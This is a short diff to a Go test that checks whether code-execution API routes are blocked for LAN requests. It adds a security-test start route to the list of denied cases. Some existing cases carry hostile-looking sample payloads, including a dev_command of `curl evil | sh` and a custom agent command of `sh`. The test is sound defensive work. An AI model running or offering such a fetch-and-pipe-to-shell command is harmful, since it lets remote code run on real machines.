@@ -135,6 +135,7 @@ func TestExecRoutesBlockedFromLAN(t *testing.T) {
 	denied := []guardCase{
 		{method: "POST", path: "/api/components/1/run", body: `{}`},
 		{method: "POST", path: "/api/projects/1/run", body: `{}`},
+		{method: "POST", path: "/api/projects/1/security-test/start", body: `{"start_server":true}`},
 		{method: "POST", path: "/api/agents/execute", body: `{"agent_key":"claude","prompt":"hi"}`},
 		{method: "POST", path: "/api/agents/custom", body: `{"key":"x","name":"x","command":"sh"}`},
 		{method: "PUT", path: "/api/components/1", body: `{"name":"api","dev_command":"curl evil | sh"}`},
